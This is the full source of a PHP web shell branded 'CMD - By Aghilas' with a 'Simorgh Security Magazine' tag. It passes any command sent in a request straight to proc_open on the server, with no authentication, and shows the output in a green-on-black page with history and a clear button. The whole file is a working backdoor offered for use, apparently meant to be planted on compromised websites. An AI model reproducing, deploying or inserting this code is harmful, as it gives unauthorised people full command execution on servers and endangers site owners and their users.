<?php
/*Simorgh Security Magazine */
  session_start();
if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
    $_SESSION['cwd'] = getcwd();
    $_SESSION['history'] = array();
    $_SESSION['output'] = '';
  }
  
  if (!empty($_REQUEST['command'])) {
    {
      $_REQUEST['command'] = stripslashes($_REQUEST['command']);
    }
    if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)
      unset($_SESSION['history'][$i]);
    
    array_unshift($_SESSION['history'], $_REQUEST['command']);
  
    $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . "\n";

    if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {
      $_SESSION['cwd'] = dirname(__FILE__);
    } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {

      if ($regs[1][0] == '/') {

        $new_dir = $regs[1];
      } else {

        $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
      }
      

      while (strpos($new_dir, '/./') !== false)
        $new_dir = str_replace('/./', '/', $new_dir);


      while (strpos($new_dir, '//') !== false)
        $new_dir = str_replace('//', '/', $new_dir);

      while (preg_match('|/\.\.(?!\.)|', $new_dir))
        $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
      
      if ($new_dir == '') $new_dir = '/';
      

      if (@chdir($new_dir)) {
        $_SESSION['cwd'] = $new_dir;
      } else {
        $_SESSION['output'] .= " not allowed to: $new_dir\n";
      }
      
    } else {

      chdir($_SESSION['cwd']);

      $length = strcspn($_REQUEST['command'], " \t");
      $token = substr($_REQUEST['command'], 0, $length);
      if (isset($aliases[$token]))
        $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
    
      $p = proc_open($_REQUEST['command'],
                     array(1 => array('pipe', 'w'),
                           2 => array('pipe', 'w')),
                     $io);


      while (!feof($io[1])) {
        $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
                                                ENT_COMPAT, 'UTF-8');
      }

      while (!feof($io[2])) {
        $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
                                                ENT_COMPAT, 'UTF-8');
      }
      
      fclose($io[1]);
      fclose($io[2]);
      proc_close($p);
    }
  }


  if (empty($_SESSION['history'])) {
    $js_command_hist = '""';
  } else {
    $escaped = array_map('addslashes', $_SESSION['history']);
    $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
  }


header('Content-Type: text/html; charset=UTF-8');

echo ' ' . "\n";
?>

<head><title>CMD - By Aghilas</title>
</head>
<body   onload="init()" style="color: #00FF00; background-color: #000000">
<span style="background-color: #000000">
<center>
<p><span style="background-color: #000000">&nbsp;<font color=green>Directory &nbsp;:&nbsp;&nbsp; </span> <code>
<span style="background-color: red"><font color=blue><?php echo $_SESSION['cwd'] ?></span></code></p>
<form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post">
<div style="width: 900; height: 454">
<textarea name="output" readonly="readonly" cols="70" rows="20" style="color: #CCFF33; border: 1px dashed #FF0000; background-color: #000000">
<?php
$lines = substr_count($_SESSION['output'], "\n");
$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
echo rtrim($padding . $_SESSION['output']);
?>
</textarea><center>
<p class="prompt" align="justify" aligne=center>
 <center> Command : <input class="prompt" name="command" type="text"
                onkeyup="key(event)" size="60" tabindex="1" style="border: 1px dotted #808080">
<input type="submit" value="Enter" /><input type="submit" name="reset" value="Clear" />
</p>
<p class="prompt" align="center">
<br>
<br>
<font color="#C0C0C0" size="2">-----------------<br>
By Aghilas<br>
<a href="http://localhost/" style="text-decoration: none">
<font color="lime">2009-2013</font></a></font><br><font color="#C0C0C0" size="2">-----------------
<br></p>
</div><br><br><br>
<font color=green>&nbsp;&nbsp;&nbsp; v 1.0 <font color=red>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;==><font color=white> SAMPLE CMD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
<font color=green>v 2.0 (finale version) <font color=red>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;==> 
<font color=gray>Added New CSS + 'Clear' Button ! + CWD ( directory )
</form>


</html>